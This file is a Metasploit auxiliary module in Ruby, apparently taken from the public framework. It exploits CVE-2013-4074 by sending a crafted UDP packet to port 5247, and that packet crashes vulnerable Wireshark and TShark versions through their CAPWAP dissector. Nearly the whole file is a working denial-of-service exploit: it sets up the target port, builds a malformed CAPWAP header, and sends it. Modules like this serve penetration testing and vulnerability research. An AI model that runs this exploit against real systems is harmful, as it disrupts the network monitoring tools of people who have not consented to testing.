##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireshark CAPWAP Dissector DoS',
      'Description'    => %q{
        This module injects a malformed UDP packet to crash Wireshark and TShark 1.8.0 to 1.8.7, as well
        as 1.6.0 to 1.6.15. The vulnerability exists in the CAPWAP dissector which fails to handle a
        packet correctly when an incorrect length is given.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Laurent Butti', # Discovery vulnerability
          'j0sm1'  # Auxiliary msf module
        ],
      'References'     =>
        [
          ['CVE', '2013-4074'],
          ['OSVDB', '94091'],
          ['BID', '60500']
        ],
      'DisclosureDate' => 'Apr 28 2014'))

    # Protocol capwap needs port 5247 to trigger the dissector in wireshark
    register_options([ Opt::RPORT(5247) ])
  end

  def run

    connect_udp

    # We send a packet incomplete to crash dissector
    print_status("#{rhost}:#{rport} - Trying to crash wireshark capwap dissector ...")
    # With 0x90 in this location we set to 1 the flags F and M. The others flags are sets to 0, then
    # the dissector crash
    # You can see more information here: https://www.rfc-editor.org/rfc/rfc5415.txt
    # F = 1 ; L = 0 ; W = 0 ; M = 1 ; K = 0 ; Flags = 000
    buf = Rex::Text.rand_text(3) + "\x90" + Rex::Text.rand_text(15)
    udp_sock.put(buf)

    disconnect_udp

  end
end
